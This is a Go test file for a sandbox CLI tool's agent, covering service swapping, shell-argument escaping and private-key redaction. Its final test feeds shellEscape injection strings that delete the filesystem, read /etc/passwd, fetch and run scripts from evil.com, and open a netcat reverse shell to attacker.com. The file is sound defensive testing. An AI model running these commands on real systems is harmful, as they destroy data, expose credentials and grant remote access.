package tui

import (
	"context"
	"encoding/base64"
	"strings"
	"testing"

	"github.com/aspectrr/fluid.sh/fluid-cli/internal/redact"
	"github.com/aspectrr/fluid.sh/fluid-cli/internal/sandbox"
)

// stubService is a minimal sandbox.Service for testing SetSandboxService.
type stubService struct {
	closed bool
}

func (s *stubService) CreateSandbox(context.Context, sandbox.CreateRequest) (*sandbox.SandboxInfo, error) {
	return nil, nil
}

func (s *stubService) GetSandbox(context.Context, string) (*sandbox.SandboxInfo, error) {
	return nil, nil
}

func (s *stubService) ListSandboxes(context.Context) ([]*sandbox.SandboxInfo, error) {
	return nil, nil
}
func (s *stubService) DestroySandbox(context.Context, string) error { return nil }
func (s *stubService) StartSandbox(context.Context, string) (*sandbox.SandboxInfo, error) {
	return nil, nil
}
func (s *stubService) StopSandbox(context.Context, string, bool) error { return nil }
func (s *stubService) RunCommand(context.Context, string, string, int, map[string]string) (*sandbox.CommandResult, error) {
	return nil, nil
}

func (s *stubService) CreateSnapshot(context.Context, string, string) (*sandbox.SnapshotInfo, error) {
	return nil, nil
}
func (s *stubService) ListVMs(context.Context) ([]*sandbox.VMInfo, error) { return nil, nil }
func (s *stubService) ValidateSourceVM(context.Context, string) (*sandbox.ValidationInfo, error) {
	return nil, nil
}

func (s *stubService) PrepareSourceVM(context.Context, string, string, string) (*sandbox.PrepareInfo, error) {
	return nil, nil
}

func (s *stubService) RunSourceCommand(context.Context, string, string, int) (*sandbox.SourceCommandResult, error) {
	return nil, nil
}

func (s *stubService) ReadSourceFile(context.Context, string, string) (string, error) {
	return "", nil
}
func (s *stubService) GetHostInfo(context.Context) (*sandbox.HostInfo, error) { return nil, nil }
func (s *stubService) Health(context.Context) error                           { return nil }
func (s *stubService) Close() error {
	s.closed = true
	return nil
}

func TestSetSandboxService_AfterCancel(t *testing.T) {
	a := &FluidAgent{}
	svc := &stubService{}
	if err := a.SetSandboxService(svc); err != nil {
		t.Fatalf("SetSandboxService on idle agent should succeed: %v", err)
	}
	if a.service != svc {
		t.Fatal("expected service to be set")
	}
}

func TestSetSandboxService_WhileRunning(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	a := &FluidAgent{
		cancelFunc: cancel,
		done:       make(chan struct{}),
	}
	// Simulate a running agent by keeping ctx alive
	_ = ctx
	svc := &stubService{}
	err := a.SetSandboxService(svc)
	if err == nil {
		t.Fatal("expected error when agent is running")
	}
	if !strings.Contains(err.Error(), "cancel first") {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestSetSandboxService_ClosesOldService(t *testing.T) {
	oldSvc := &stubService{}
	a := &FluidAgent{service: oldSvc}
	newSvc := &stubService{}
	if err := a.SetSandboxService(newSvc); err != nil {
		t.Fatalf("SetSandboxService should succeed: %v", err)
	}
	if !oldSvc.closed {
		t.Fatal("expected old service to be closed")
	}
	if a.service != newSvc {
		t.Fatal("expected new service to be set")
	}
}

func TestSetSandboxService_WaitsForDone(t *testing.T) {
	done := make(chan struct{})
	a := &FluidAgent{done: done}
	// Close done channel to simulate goroutine finishing
	close(done)
	svc := &stubService{}
	if err := a.SetSandboxService(svc); err != nil {
		t.Fatalf("SetSandboxService should succeed after done: %v", err)
	}
}

func TestSetSandboxService_TimesOut(t *testing.T) {
	done := make(chan struct{}) // never closed
	a := &FluidAgent{done: done}
	svc := &stubService{}
	err := a.SetSandboxService(svc)
	if err == nil {
		t.Fatal("expected timeout error")
	}
	if !strings.Contains(err.Error(), "timed out") {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestShellEscape(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "simple path",
			input:    "/path/to/file",
			expected: "'/path/to/file'",
		},
		{
			name:     "path with spaces",
			input:    "/path/with spaces/file",
			expected: "'/path/with spaces/file'",
		},
		{
			name:     "path with single quote",
			input:    "/path/with'quote/file",
			expected: "'/path/with'\\''quote/file'",
		},
		{
			name:     "path with multiple single quotes",
			input:    "/path/'with'/'multiple'/quotes",
			expected: "'/path/'\\''with'\\''/'\\''multiple'\\''/quotes'",
		},
		{
			name:     "path with double quote",
			input:    `/path/with"doublequote/file`,
			expected: `'/path/with"doublequote/file'`,
		},
		{
			name:     "path with dollar sign",
			input:    "/path/with$(command)/file",
			expected: "'/path/with$(command)/file'",
		},
		{
			name:     "path with backtick",
			input:    "/path/with`backtick`/file",
			expected: "'/path/with`backtick`/file'",
		},
		{
			name:     "path with semicolon",
			input:    "/path/with;semicolon/file",
			expected: "'/path/with;semicolon/file'",
		},
		{
			name:     "path with ampersand",
			input:    "/path/with&ampersand/file",
			expected: "'/path/with&ampersand/file'",
		},
		{
			name:     "path with pipe",
			input:    "/path/with|pipe/file",
			expected: "'/path/with|pipe/file'",
		},
		{
			name:     "empty string",
			input:    "",
			expected: "''",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := shellEscape(tt.input)
			if result != tt.expected {
				t.Errorf("shellEscape(%q) = %q, want %q", tt.input, result, tt.expected)
			}
		})
	}
}

// redactViaRedactor is a test helper that uses the same Redactor the agent uses.
func redactViaRedactor(content string) (string, bool) {
	r := redact.New()
	result := r.Redact(content)
	return result, result != content
}

func TestRedactPrivateKeys_RSAKey(t *testing.T) {
	input := "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----"
	result, redacted := redactViaRedactor(input)
	if !redacted {
		t.Fatal("expected redaction")
	}
	if strings.Contains(result, "BEGIN RSA PRIVATE KEY") {
		t.Errorf("key content should be redacted: %s", result)
	}
}

func TestRedactPrivateKeys_ECKey(t *testing.T) {
	input := "-----BEGIN EC PRIVATE KEY-----\nMHQCAQEEI...\n-----END EC PRIVATE KEY-----"
	result, redacted := redactViaRedactor(input)
	if !redacted {
		t.Fatal("expected redaction")
	}
	if strings.Contains(result, "BEGIN EC PRIVATE KEY") {
		t.Errorf("key content should be redacted: %s", result)
	}
}

func TestRedactPrivateKeys_GenericKey(t *testing.T) {
	input := "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBg...\n-----END PRIVATE KEY-----"
	result, redacted := redactViaRedactor(input)
	if !redacted {
		t.Fatal("expected redaction")
	}
	if strings.Contains(result, "BEGIN PRIVATE KEY") {
		t.Errorf("key content should be redacted: %s", result)
	}
}

func TestRedactPrivateKeys_NoKey(t *testing.T) {
	input := "just some normal file content\nwith multiple lines"
	result, redacted := redactViaRedactor(input)
	if redacted {
		t.Fatal("expected no redaction")
	}
	if result != input {
		t.Errorf("content should be unchanged")
	}
}

func TestRedactPrivateKeys_MixedContent(t *testing.T) {
	input := "# Config file\nssl_key: |\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----\nssl_port: 443"
	result, redacted := redactViaRedactor(input)
	if !redacted {
		t.Fatal("expected redaction")
	}
	if !strings.Contains(result, "ssl_port: 443") {
		t.Error("non-key content should be preserved")
	}
	if strings.Contains(result, "MIIEpAIBAAKCAQEA") {
		t.Error("key content should be removed")
	}
}

func TestRedactPrivateKeys_MultipleKeys(t *testing.T) {
	input := "-----BEGIN RSA PRIVATE KEY-----\nkey1\n-----END RSA PRIVATE KEY-----\nsome text\n-----BEGIN EC PRIVATE KEY-----\nkey2\n-----END EC PRIVATE KEY-----"
	result, redacted := redactViaRedactor(input)
	if !redacted {
		t.Fatal("expected redaction")
	}
	if strings.Contains(result, "key1") || strings.Contains(result, "key2") {
		t.Error("both keys should be redacted")
	}
	if !strings.Contains(result, "some text") {
		t.Error("text between keys should be preserved")
	}
}

func TestRedactPrivateKeys_CRLF(t *testing.T) {
	input := "-----BEGIN RSA PRIVATE KEY-----\r\nMIIEowIBAAKCAQEA...\r\n-----END RSA PRIVATE KEY-----"
	result, redacted := redactViaRedactor(input)
	if !redacted {
		t.Fatal("expected redaction")
	}
	if strings.Contains(result, "BEGIN RSA PRIVATE KEY") {
		t.Errorf("key should be redacted: %s", result)
	}
}

func TestRedactSensitiveKeys_Base64PEM(t *testing.T) {
	pem := "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----"
	encoded := base64.StdEncoding.EncodeToString([]byte(pem))
	result, redacted := redactViaRedactor(encoded)
	if !redacted {
		t.Fatal("expected base64 PEM key to be redacted")
	}
	if strings.Contains(result, "LS0tLS1CRUdJTi") {
		t.Error("base64 PEM content should be replaced")
	}
}

func TestRedactSensitiveKeys_Base64ECPEM(t *testing.T) {
	pem := "-----BEGIN EC PRIVATE KEY-----\nMHQCAQEEI...\n-----END EC PRIVATE KEY-----"
	encoded := base64.StdEncoding.EncodeToString([]byte(pem))
	result, redacted := redactViaRedactor(encoded)
	if !redacted {
		t.Fatal("expected base64 EC PEM key to be redacted")
	}
	if strings.Contains(result, "LS0tLS1CRUdJTi") {
		t.Error("base64 EC PEM content should be replaced")
	}
}

func TestRedactSensitiveKeys_K8sYAMLSecret(t *testing.T) {
	input := "  tls.key: " + strings.Repeat("ABCDEFGHIJKLMNOP", 5)
	result, redacted := redactViaRedactor(input)
	if !redacted {
		t.Fatal("expected K8s tls.key field to be redacted")
	}
	if !strings.Contains(result, "[REDACTED_KEY_") {
		t.Errorf("unexpected result: %s", result)
	}
}

func TestRedactSensitiveKeys_K8sJSONSecret(t *testing.T) {
	input := `"private_key": "` + strings.Repeat("ABCDEFGHIJKLMNOP", 5) + `"`
	result, redacted := redactViaRedactor(input)
	if !redacted {
		t.Fatal("expected K8s private_key field to be redacted")
	}
	if !strings.Contains(result, "[REDACTED_KEY_") {
		t.Errorf("unexpected result: %s", result)
	}
}

func TestRedactSensitiveKeys_RegularBase64NotRedacted(t *testing.T) {
	// Base64 that decodes to regular text, not a private key
	input := base64.StdEncoding.EncodeToString([]byte("just some regular content"))
	result, redacted := redactViaRedactor(input)
	if redacted {
		t.Fatal("regular base64 should not be redacted")
	}
	if result != input {
		t.Error("content should be unchanged")
	}
}

func TestRedactSensitiveKeys_NoKeys(t *testing.T) {
	input := "just some normal file content\nwith multiple lines"
	result, redacted := redactViaRedactor(input)
	if redacted {
		t.Fatal("expected no redaction")
	}
	if result != input {
		t.Error("content should be unchanged")
	}
}

func TestRedactPrivateKeys_CertificateNotRedacted(t *testing.T) {
	input := "-----BEGIN CERTIFICATE-----\nMIIDXTCCAkWgAwIBAgIJ...\n-----END CERTIFICATE-----"
	result, redacted := redactViaRedactor(input)
	if redacted {
		t.Fatal("certificates should not be redacted")
	}
	if result != input {
		t.Errorf("certificate content should be unchanged")
	}
}

// TestShellEscapeInjectionPrevention tests that shellEscape prevents command injection
func TestShellEscapeInjectionPrevention(t *testing.T) {
	maliciousInputs := []string{
		"'; rm -rf /; echo '",
		"' && cat /etc/passwd && echo '",
		"'; curl http://evil.com/malware.sh | sh; echo '",
		"' || wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh || '",
		"'; nc -e /bin/sh attacker.com 4444; echo '",
	}

	for _, input := range maliciousInputs {
		result := shellEscape(input)
		// The escaped result should still be wrapped in single quotes
		// and should not contain unescaped single quotes that would break out
		if result[0] != '\'' || result[len(result)-1] != '\'' {
			t.Errorf("shellEscape did not wrap input in quotes: %q", result)
		}

		// Verify that the escaped string doesn't contain standalone single quotes
		// that would break out of the quoting context
		// (Note: '\'' sequences are safe as they properly escape the quote)
		// We're checking that we don't have a single quote without the escape sequence
		for i := 0; i < len(result); i++ {
			if result[i] == '\'' {
				// This is okay if it's at the start or end
				if i == 0 || i == len(result)-1 {
					continue
				}
				// This is okay if it's part of the '\'' escape sequence
				if i >= 1 && result[i-1] == '\\' {
					continue
				}
				// This is okay if it starts the '\'' sequence
				if i+2 < len(result) && result[i+1] == '\\' && result[i+2] == '\'' {
					continue
				}
				// This is okay if it ends the '\'' sequence
				if i >= 2 && result[i-2] == '\\' && result[i-1] == '\'' {
					continue
				}
				t.Errorf("Found unescaped single quote in result at position %d: %q", i, result)
			}
		}
	}
}
